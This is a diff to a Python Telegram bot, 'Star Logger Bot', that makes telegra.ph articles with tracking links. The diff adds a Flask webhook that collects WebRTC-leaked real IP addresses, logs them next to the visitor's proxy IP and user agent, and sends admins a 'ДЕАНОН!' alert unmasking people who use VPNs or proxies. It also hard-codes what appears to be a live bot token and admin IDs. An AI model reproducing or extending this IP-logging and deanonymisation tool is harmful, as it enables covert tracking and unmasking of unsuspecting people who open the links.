@@ -5,6 +5,7 @@ import string
 import secrets
 import sqlite3
 import urllib.parse
+import threading
 from datetime import datetime
 from dotenv import load_dotenv
 
@@ -18,14 +19,13 @@ load_dotenv()
 BOT_TOKEN   = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_BOT_TOKEN") or "9010108280:AAH18qw9pxpEm_FiDTQtOp4KMOWpLJ9DqOE"
 ADMIN_IDS   = [int(x) for x in (os.environ.get("ADMIN_IDS") or "8297446667").split(",") if x.strip().lstrip("-").isdigit()]
 LOG_CHAT_ID = int(os.environ.get("LOG_CHAT_ID") or "-1004382024668")
-# НОВЫЙ ДОМЕН
 WORKER_URL  = os.environ.get("WORKER_URL") or "https://trak.geminialex12.workers.dev"
 DB_PATH     = os.environ.get("DB_PATH") or "/tmp/database2.db"
 
+# --- ПОДПИСКА НА КАНАЛ ---
 CHANNEL_ID    = -1004336153105
-GROUP_ID      = -1004382024668
 CHANNEL_LINK  = "https://t.me/+c3xyHely39ozNDYy"
-GROUP_LINK    = "https://t.me/+c3xyHely39ozNDYy" 
+
 SUPPORT       = "@boyfrer"
 PREMIUM_PRICE = 5.0
 
@@ -64,6 +64,10 @@ def db_init():
         CREATE TABLE IF NOT EXISTS settings (
             key TEXT PRIMARY KEY,
             value TEXT
+        );
+        CREATE TABLE IF NOT EXISTS rtc_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip TEXT, real_ip TEXT, ua TEXT, ts INTEGER
         );
         """)
 
@@ -150,12 +154,11 @@ def get_all_links(limit=20):
 # ---------- UTIL ----------
 def check_sub(user_id):
     try:
-        status_ch = bot.get_chat_member(CHANNEL_ID, user_id).status
-        if status_ch not in ["member", "administrator", "creator"]: return False
-        status_gr = bot.get_chat_member(GROUP_ID, user_id).status
-        if status_gr not in ["member", "administrator", "creator"]: return False
-        return True
-    except Exception: return False
+        # Проверяем ТОЛЬКО КАНАЛ
+        status = bot.get_chat_member(CHANNEL_ID, user_id).status
+        return status in ["member", "administrator", "creator"]
+    except Exception:
+        return False
 
 def send_log(text):
     try: bot.send_message(LOG_CHAT_ID, text, disable_web_page_preview=True)
@@ -186,6 +189,41 @@ def make_article(title, text, img_url, template_name, author_id, author_username
     url = f"https://telegra.ph/{page['path']}"
     msg = f"<b>⭐️Star Logger Bot⭐️</b>\n<b>⭐️Статья создана</b>\n=============================\n⭐️Тема: {title}\n⭐️Ссылка: {url}"
     return msg, url, slug
+
+# ---------- WEBHOOK ДЛЯ ДЕАНОНА (WebRTC) ----------
+from flask import Flask, request, jsonify
+web_app = Flask(__name__)
+
+@web_app.route('/webhook_rtc', methods=['POST'])
+def webhook_rtc():
+    data = request.json
+    if not data: return jsonify({"ok": False}), 400
+    
+    ip = data.get("ip")
+    real_ip = data.get("real_ip")
+    ua = data.get("ua")
+    
+    if not real_ip or real_ip == "—" or ip == real_ip:
+        return jsonify({"ok": True})
+    
+    with _conn() as c:
+        old = c.execute("SELECT ip, ts FROM rtc_logs WHERE real_ip=? AND ip != ?", (real_ip, ip)).fetchone()
+        c.execute("INSERT INTO rtc_logs (ip, real_ip, ua, ts) VALUES (?,?,?,?)", (ip, real_ip, ua, int(time.time())))
+        
+        if old:
+            msg = (f"🚨 <b>ДЕАНОН!</b>\n"
+                   f"Реальный IP: <code>{real_ip}</code>\n"
+                   f"Зашел с IP: <code>{ip}</code>\n"
+                   f"Раньше заходил с: <code>{old['ip']}</code>")
+            for aid in ADMIN_IDS:
+                try: bot.send_message(aid, msg, parse_mode="HTML")
+                except: pass
+                
+    return jsonify({"ok": True})
+
+def run_webhook():
+    print("[*] Webhook server on port 8080")
+    web_app.run(host="0.0.0.0", port=8080, threaded=True, use_reloader=False)
 
 # ---------- MENUS ----------
 def show_main_menu(uid):
@@ -225,9 +263,8 @@ def cmd_start(message):
     if not check_sub(uid) and uid not in ADMIN_IDS:
         kb = types.InlineKeyboardMarkup()
         kb.add(types.InlineKeyboardButton("📢 Подписаться на канал", url=CHANNEL_LINK))
-        kb.add(types.InlineKeyboardButton("💬 Вступить в группу", url=GROUP_LINK))
         kb.add(types.InlineKeyboardButton("✅ Проверить", callback_data='check_sub'))
-        bot.send_message(uid, "<b>⚠️ Для использования бота подпишись на канал и вступи в группу!</b>", reply_markup=kb)
+        bot.send_message(uid, "<b>⚠️ Для использования бота подпишись на наш канал!</b>", reply_markup=kb)
         return
 
     show_main_menu(uid)
@@ -238,7 +275,7 @@ def cb_check_sub(call):
         bot.delete_message(call.message.chat.id, call.message.message_id)
         show_main_menu(call.message.chat.id)
     else:
-        bot.answer_callback_query(call.id, "❌ Ты подписался не на всё! Проверь канал и группу.", show_alert=True)
+        bot.answer_callback_query(call.id, "❌ Ты не подписался на канал!", show_alert=True)
 
 # ---------- CALLBACKS ----------
 @bot.callback_query_handler(func=lambda c: c.data == 'home')
@@ -388,7 +425,7 @@ def cb_admin_dump(call):
 @bot.callback_query_handler(func=lambda c: c.data == 'logger')
 def cb_logger(call):
     if not check_sub(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
-        bot.answer_callback_query(call.id, "❌ Подпишись на канал и группу!", show_alert=True)
+        bot.answer_callback_query(call.id, "❌ Подпишись на канал!", show_alert=True)
         return
     max_links = 20 if is_premium(call.from_user.id) else 5
     if call.from_user.id not in ADMIN_IDS and get_user_links_count(call.from_user.id) >= max_links:
@@ -516,5 +553,6 @@ def _cust_img(message):
 # ---------- ENTRY ----------
 if __name__ == "__main__":
     db_init()
+    threading.Thread(target=run_webhook, daemon=True).start()
     print("[*] bot polling…")
     bot.infinity_polling()
